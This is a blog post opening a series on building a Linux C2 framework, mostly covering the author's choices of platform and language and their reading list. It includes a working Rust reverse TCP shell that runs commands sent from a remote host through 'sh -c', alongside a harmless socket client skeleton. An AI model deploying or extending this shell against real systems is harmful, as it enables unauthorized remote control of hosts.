+++
title = "Becoming A Problem: Part 1 - Escaping the Electric Chair"
date = 2026-10-31
description = "part 1"
[extra]
image = "electric_chair.jpeg"
author = "witherrors"
+++

# <u> THE SOCKET AND THE FORK </u>

<br>
<img src="electric_chair.jpeg" width="800">
<br>

I have spent the last 3 years strapped to this chair, knowing that I want to build a c2 framework (I'm really not sure why at this point, I need an escape I guess), but accomplishing nothing. Whats kept me here? A little thing called "analysis paralysis". 

- I have to consider the language of both the agent and the webserver
- The target platform 
- I've got absolute madmen at the industry helm telling me programming is dead
- I hop languages the second I find an excuse to
- I also have no idea what I'm doing

It feels like my brain is wired to consider any and all options before I can make a single step out of fear of failure.

<br>
<img src="abby_someone.jpg" width="800">
<br>

This has been brutal, inefficient, and a waste of time. Its led to a lot of surface level understanding but no real depth in anything (similar to my career). Its time to cut the power, stop cooking this goose, and clearly define a scope to this project if were going to make it anywhere. Let call these decisions out explicitly and dive into how I've arrived at them:

## <u> The Target Platform </u>

I will be targeting Linux hosts, specifically a userland process on Ubuntu 26.04 LTS x64. Why?

- I enjoy Linux and it is my preferred daily driver
- While Linux has a much smaller desktop usage share, it powers nearly everything else
- Its not Windows (this space has a ton of research)
- Its not macOS (maybe a target for a second agent)

Why Ubuntu? 

IMO, if RHEL has the majority of enterprise on-prem server market usage, Ubuntu dominates the cloud space. <u>This is a direction we are interested in.</u> 

Do we want to move onto other types of devices, embedded Linux systems, etc? Absolutely. In fact it may be worth highlighting what I have entertained but shelved instead to keep a tight scope:

- [musl](https://musl.libc.org/about.html)
- Using Rust for the initial agent
- [ebpf](https://ebpf.io/what-is-ebpf/)

I'll keep this called out and pinned in future posts so we have a clear view of what we have, where were going, and what our next task will be.

## <u> The Agent </u>

My initial agent will be C and not Rust. Why?

- It is A LOT to learn both Linux systems programming, Rust, agent development, etc
- It will be a good learning exercise to compare my own C agent with a potential future Rust agent
- There are a TON of great existing resources written in C
- We want to stay pragmatic, tightly scoped, and have a firm understanding of the work thats come before us

To be clear, I attempted the Rust agent path. I found this to be a trap. I present [Exhitbit A](https://github.com/witherrors/missyelliott):

<h1 class="glitch" data-text="FINALLY SOME CODE...OH CLOSE YOUR EYES, CLOSE YOUR EYES!">FINALLY SOME CODE...OH CLOSE YOUR EYES, CLOSE YOUR EYES!</h1>


```
use std::net::{Ipv4Addr, TcpStream};
use std::env;
use std::process;
use std::io::{self, BufRead, Write, BufReader};
use std::process::Command;



//takes ipv4 string, checks if valid format
fn validate_ip(ip: &str) -> bool {
    match ip.parse::<Ipv4Addr>() {
        Ok(_ip) => {
            println!("[+] valid ipv4 address");
            true
        }
        Err(_err) => {
            eprintln!("[-] not valid ipv4 address");
            false
        }
    }
}

fn main() -> io::Result<()> {

    //collect command line args && validate
    let args: Vec<String> = env::args().collect();

    if args.len() != 3 {
        eprintln!("[-] Usage: {} <ipv4_address> <port>", args[0]);
        process::exit(1);
    }

    let ip = &args[1];
    let port = &args[2];

    if !validate_ip(ip) {
        eprintln!("[-] exiting program due to invalid IP address.");
        process::exit(1);
    }

    //validated, now connect to remote host

    let addr = ip.to_owned() + ":" + port;

    //debug to check addr
    println!("{}", addr);

    //send data to server
    let stream = TcpStream::connect(addr)?;
    println!("[+] we connected to a server!");

    //clone stream for independant read/write
    let mut writer = stream.try_clone()?;
    let mut reader = BufReader::new(stream);

    //our command execution loop

    loop{
        //send message
        writer.write_all(b">")?;
        writer.flush()?;

        //read response
        let mut response = String::new();
        reader.read_line(&mut response)?;

        if response.trim() == "exit" {
            break;
        }

        let shell_command = Command::new("sh")
            .arg("-c")
            .arg(&response)
            .output()?;

        writer.write_all(&shell_command.stdout);
        writer.write_all(&shell_command.stderr);
        writer.flush()?;
    }

    Ok(())

}
```
That little guy right there is a pretty weak sauce reverse tcp shell that I was going to improve on but realized if I wanted to reach out of the Rust standard library and use system calls (in this case glibc), I'm going to have to get smart on Rust Foreign Function Interfaces ([FFI](https://en.wikipedia.org/wiki/Foreign_function_interface)) or use crates that do this for us ([nix](https://docs.rs/nix/0.31.3/nix/) or [glibc](https://docs.rs/libc/latest/libc/)). 

How much of a signature does that leave? I'm not sure. Sounds like a future project if anything. 

## <u> what the FUCK did he just say? </u>

If were going to program anything for a specific operating system, it would benefit us to write with (or at least understand) the programming language the operating system is written in and the API interfaces available to us. 

The Linux kernel is written in C (and Rust [now](https://www.heise.de/en/news/Linux-Kernel-Rust-Support-Officially-Approved-11109808.html)). 

We also have glibc, which is an implementation of the POSIX API, that is also written in C. 

If I want my agent to behave like a normal userland process, I need it to act like and make syscalls as a normal userland process might. In order to make those calls using Rust, I need to write an FFI to interact with a C API and make that call.

<img src="normal.gif" alt="Alternate text" width="800"/>


I can go down this road, but for the sake of learning and developing as a first timer, this comes off as just writing a C agent with extra steps. I don't want to downplay the safety and benefits of using Rust (type system, Cargo, etc), but if my agent is full of `unsafe` Rust FFI calls that are written poorly, I will have gained virtually nothing by opting to utilize Rust over C for the agent. I have instead opted to consider a Rust agent at a later time for this reason (I'll have more experience under my belt then).

So what are we keeping from that code in our C agent? Unfortunately, nothing except the concepts that are nicely obfuscated away.

## <u> Flipping the Switch </u>

Lets talk about resources for this endeavor:

- If I was digging into building an agent from scratch one of the first things I might do is look at the players and projects that have come before me. Ripping into Meterpreter from Rapid 7's Metasploit is a tried and true northstar for development and there is even a POSIX focused agent that could help us out ([Mettle](https://github.com/rapid7/mettle)).

- I might check out groups that are doing crazy things in the *nix/elf file space such as [tmp.out](https://tmpout.sh/) and realize "oh I am out of my depth".

- If you have zero C experience, I recommend K.N King's [*C Programming: A Modern Approach*](http://knking.com/books/c2/index.html).

- If you want to dive deeper into Linux/Unix Systems Programming (this is my new bible) I recommend Michael Kerrisk's [*The Linux Programming Interface*](https://nostarch.com/tlpi).

- If you haven't dealt with network programming on Unix before ... or on any OS ... I recommend Richard Steven's [*Unix Network Programming Vol. 3*](https://unpbook.com/)

In fact that last resource provides us with exactly the bones were looking for.

<h1 class="glitch" data-text="NO NOT AGAIN!">NO NOT AGAIN!</h1>
<br>
</br>

```
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>


#define SA struct sockaddr
#define MAXLINE 4096

int main (int argc, char **argv) {
    int sockfd, n;
    char recvline[MAXLINE + 1];
    struct sockaddr_in servaddr;

    if (argc != 2){
        perror("too many arguments"); //not using unp.h err_ functions
        exit(1);
    }

    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        perror("socket error");

    //bzero(&servaddr, sizeof(servaddr)); //deprecated
    memset(&servaddr, 0, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(13); //server port, hardcoded - host to network short
    if (inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0){
        fprintf(stderr, "inet_pton error for %s", argv[1]);
        exit(1);
    }

    if (connect(sockfd, (SA *) &servaddr, sizeof(servaddr)) < 0)
        perror("connect error");

    while ( (n = read(sockfd, recvline, MAXLINE)) > 0) {
        recvline[n] = 0; //null terminate
        if (fputs(recvline, stdout) == EOF)
            perror("fputs error");
    }

    if (n < 0)
        perror("read error");

}
```

This is the classic Richard Stevens daytimetcpcli.c code with a few modifications and updating. I'll leave it up to you to figure out what I've changed and why here (this is a good learning exercise in itself). This is our skeleton and everything from here on out will be building on these blocks. 

# <u>In Summary</u>

Just like that, we've done it. We've taken our first step forward with our skeleton code, we've defined and limited our scope to something we can reasonably accomplish, and we've ended our development paralysis. 

Join me on my next post where we identify the faults our current skeleton has, we talk about our development enviornment and setup, and review the progress we've made towards the identified issues.

<h1 class="glitch" data-text="STOP ANALYZING. JUST EXECUTE. EXECUTE THEM ALL.">STOP ANALYZING. JUST EXECUTE. EXECUTE THEM ALL.</h1>

<br>
<br>
<img src="super_duper.gif" alt="Alternate text" width="800"/>

---------------------------------------------------------------------------

<br>

You already know whats coming:

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
    src="https://www.youtube.com/embed/YsGjFh1ke44?si=WWOD9Q0iRHQTSTLh"
    title="YouTube video player" 
    frameborder="0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
    referrerpolicy="strict-origin-when-cross-origin" 
    allowfullscreen>
  </iframe>
</div>



